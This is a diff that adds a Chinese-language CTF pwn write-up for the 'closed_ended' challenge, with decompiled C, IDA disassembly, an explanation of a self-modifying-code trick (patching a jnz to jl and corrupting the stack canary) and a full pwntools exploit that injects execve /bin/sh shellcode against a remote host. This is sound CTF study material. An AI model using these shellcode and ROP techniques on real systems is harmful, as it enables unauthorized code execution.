@@ -3157,6 +3157,140 @@ sh.sendafter(b'pay?\n', b'2'.ljust(8, b'\0') + p64(heap_addr + 0x480))
 sh.interactive()
 ```
 
+## tsgctf-closed_ended
+
+这个是一个shellcode的题目这里我们用到了要给非常好玩的手法线上代码
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v4; // [rsp+0h] [rbp-20h] BYREF
+  _BYTE v5[10]; // [rsp+Eh] [rbp-12h] BYREF
+  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  mprotect(init_proc, 0x1000u, 7);
+  if ( !close(1)
+    && (unsigned int)__isoc99_scanf("%p", &v4) == 1
+    && (unsigned __int64)(v4 - 4198567) <= 0xF59
+    && (unsigned int)__isoc99_scanf("%*c%c", v4) == 1 )
+  {
+    mprotect(init_proc, 0x1000u, 5);
+    __isoc99_scanf("%100s", v5);
+  }
+  return 0;
+}
+```
+
+下面是这个题目的一个asm
+
+```asm
+; __unwind {
+.text:0000000000401070 000 55                            push    rbp
+.text:0000000000401071 008 BF 00 10 40 00                mov     edi, offset _init_proc          ; addr
+.text:0000000000401076 008 BE 00 10 00 00                mov     esi, 1000h                      ; len
+.text:000000000040107B 008 48 89 E5                      mov     rbp, rsp
+.text:000000000040107E 008 48 83 EC 20                   sub     rsp, 20h
+.text:0000000000401082 028 64 48 8B 14 25 28 00 00 00    mov     rdx, fs:28h
+.text:000000000040108B 028 48 89 55 F8                   mov     [rbp+var_8], rdx
+.text:000000000040108F 028 BA 07 00 00 00                mov     edx, 7                          ; prot
+.text:0000000000401094 028 E8 B7 FF FF FF                call    _mprotect
+.text:0000000000401094
+.text:0000000000401099 028 BF 01 00 00 00                mov     edi, 1                          ; fd
+.text:000000000040109E 028 E8 9D FF FF FF                call    _close
+.text:000000000040109E
+.text:00000000004010A3 028 85 C0                         test    eax, eax
+.text:00000000004010A5 028 74 13                         jz      short loc_4010BA
+.text:00000000004010A5
+.text:00000000004010A7
+.text:00000000004010A7                                   loc_4010A7:                             ; CODE XREF: main+5B↓j
+.text:00000000004010A7                                                                           ; main+6E↓j
+.text:00000000004010A7                                                                           ; main+7F↓j
+.text:00000000004010A7                                                                           ; main+A5↓j
+.text:00000000004010A7 028 48 8B 45 F8                   mov     rax, [rbp+var_8]
+.text:00000000004010AB 028 64 48 2B 04 25 28 00 00 00    sub     rax, fs:28h
+.text:00000000004010B4 028 75 61                         jnz     short loc_401117
+.text:00000000004010B4
+.text:00000000004010B6 028 C9                            leave
+.text:00000000004010B7 000 31 C0                         xor     eax, eax
+.text:00000000004010B9 000 C3                            retn
+.text:00000000004010B9
+.text:00000000004010BA                                   ; ---------------------------------------------------------------------------
+.text:00000000004010BA
+.text:00000000004010BA                                   loc_4010BA:                             ; CODE XREF: main+35↑j
+.text:00000000004010BA 028 48 8D 75 E0                   lea     rsi, [rbp+var_20]
+.text:00000000004010BE 028 BF 04 20 40 00                mov     edi, offset aP                  ; "%p"
+.text:00000000004010C3 028 E8 98 FF FF FF                call    ___isoc99_scanf
+.text:00000000004010C3
+.text:00000000004010C8 028 83 E8 01                      sub     eax, 1
+.text:00000000004010CB 028 75 DA                         jnz     short loc_4010A7
+.text:00000000004010CB
+.text:00000000004010CD 028 48 8B 75 E0                   mov     rsi, [rbp+var_20]
+.text:00000000004010D1 028 48 8D 86 59 EF BF FF          lea     rax, [rsi-4010A7h]
+.text:00000000004010D8 028 48 3D 59 0F 00 00             cmp     rax, 0F59h
+.text:00000000004010DE 028 77 C7                         ja      short loc_4010A7
+.text:00000000004010DE
+.text:00000000004010E0 028 31 C0                         xor     eax, eax
+.text:00000000004010E2 028 BF 07 20 40 00                mov     edi, offset aCC                 ; "%*c%c"
+.text:00000000004010E7 028 E8 74 FF FF FF                call    ___isoc99_scanf
+.text:00000000004010E7
+.text:00000000004010EC 028 83 E8 01                      sub     eax, 1
+.text:00000000004010EF 028 75 B6                         jnz     short loc_4010A7
+.text:00000000004010EF
+.text:00000000004010F1 028 BA 05 00 00 00                mov     edx, 5                          ; prot
+.text:00000000004010F6 028 BE 00 10 00 00                mov     esi, 1000h                      ; len
+.text:00000000004010FB 028 BF 00 10 40 00                mov     edi, offset _init_proc          ; addr
+.text:0000000000401100 028 E8 4B FF FF FF                call    _mprotect
+.text:0000000000401100
+.text:0000000000401105 028 48 8D 75 EE                   lea     rsi, [rbp+var_12]
+.text:0000000000401109 028 BF 0D 20 40 00                mov     edi, offset a100s               ; "%100s"
+.text:000000000040110E 028 31 C0                         xor     eax, eax
+.text:0000000000401110 028 E8 4B FF FF FF                call    ___isoc99_scanf
+.text:0000000000401110
+.text:0000000000401115 028 EB 90                         jmp     short loc_4010A7
+.text:0000000000401115
+.text:0000000000401117                                   ; ---------------------------------------------------------------------------
+.text:0000000000401117
+.text:0000000000401117                                   loc_401117:                             ; CODE XREF: main+44↑j
+.text:0000000000401117 028 E8 14 FF FF FF                call    ___stack_chk_fail
+.text:0000000000401117                                   ; }
+```
+
+而这个其实是一个非常典型的shellcode但是在运行的时候我们可以知道我们可以rwx的空间是我们的程序段.因此这里我们使用的手法是通过修改程序段上的一个指令就可以拿到一个shellcode，这里用的手法其实就是一个smc（**Self-Modifying Code**自修改代码）的手法，然后我们故意修改canary就可以跳转到要给stack_chk_fail这个函数的验证位置，也就是04010B4这个位置，这里可以写入一个jl的一个小于跳转，因此我们使用这个手法进行一个绕过
+
+exp:
+
+```py
+from pwn import*
+#p=process('./closed_ended')
+p=remote('34.84.25.24',50037)
+#context.log_level='debug'
+magic=0x4010B0+4
+ret=0x4010B9
+get_rwx=0x401070
+#gdb.attach(p)
+#pause()
+p.sendline(str(hex(magic)).encode())
+sleep(0.1)
+p.sendline(p8(0x7C))
+sleep(0.1)
+payload=b'a'*(0x12-8)+p64(0xffffffffffff)+p64(0x401000+0x30)+p64(get_rwx)+p64(ret)+p64(0x401105)
+p.sendline(payload)
+#========================
+sleep(0.1)
+payload=b'a'*(0x12-8)+p64(0xffffffffffffffff)+p64(0x404510)+p64(0x401060)+p64(0x401070)
+payload=payload.ljust(0x40,b'\x01')
+payload+=b'\xB0\x3B\x5F\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05'
+payload=payload.ljust(0x50,b'\x01')
+payload+=b'/b/bin/sh\x0a'
+p.sendline(payload)
+sleep(0.1)
+p.sendline(str('exec 1>&2').encode())
+p.interactive()
+```
+
+总结：这个手法主要是使用的故意修改cnanary，并且修改jnz为jl来修改一个跳转的结果，是的我们写一个ret
+
 ## 浙江省赛初赛
 
 ### pwn1
